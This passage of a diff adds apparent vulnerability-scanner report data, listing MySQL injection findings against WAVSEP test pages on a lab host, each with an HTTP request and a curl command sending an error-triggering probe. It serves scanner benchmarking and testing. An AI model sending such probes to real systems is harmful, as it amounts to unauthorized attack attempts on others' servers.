+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp\" -d \"username=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp", 
+        "parameter": "username", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsg=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp\" -d \"msg=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp", 
+        "parameter": "msg", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter orderby", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\norderby=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp\" -d \"orderby=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp", 
+        "parameter": "orderby", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionId=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp\" -d \"transactionId=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp", 
+        "parameter": "transactionId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msgId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgId=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp\" -d \"msgId=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp", 
+        "parameter": "msgId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter minBalanace", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nminBalanace=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp\" -d \"minBalanace=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp", 
+        "parameter": "minBalanace", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msgid", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgid=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp\" -d \"msgid=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp", 
+        "parameter": "msgid", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter orderby", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\norderby=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp\" -d \"orderby=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp", 
+        "parameter": "orderby", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp\" -d \"transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp\" -d \"transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp\" -d \"transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp\" -d \"transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter username", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=%BF%27%22%28&password=letmein", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp\" -d \"username=%BF%27%22%28&password=letmein\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp", 
+        "parameter": "username", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter password", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=default&password=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp\" -d \"username=default&password=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp", 
+        "parameter": "password", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsg=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp\" -d \"msg=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp", 
+        "parameter": "msg", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter username", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp\" -d \"username=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp", 
+        "parameter": "username", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsg=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp\" -d \"msg=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp", 
+        "parameter": "msg", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter orderby", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\norderby=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp\" -d \"orderby=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp", 
+        "parameter": "orderby", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionId=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp\" -d \"transactionId=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp", 
+        "parameter": "transactionId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msgId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgId=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp\" -d \"msgId=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp", 
+        "parameter": "msgId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter minBalanace", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nminBalanace=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp\" -d \"minBalanace=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp", 
+        "parameter": "minBalanace", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msgid", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgid=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp\" -d \"msgid=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp", 
+        "parameter": "msgid", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter orderby", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\norderby=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp\" -d \"orderby=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp", 
+        "parameter": "orderby", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp\" -d \"transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp\" -d \"transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
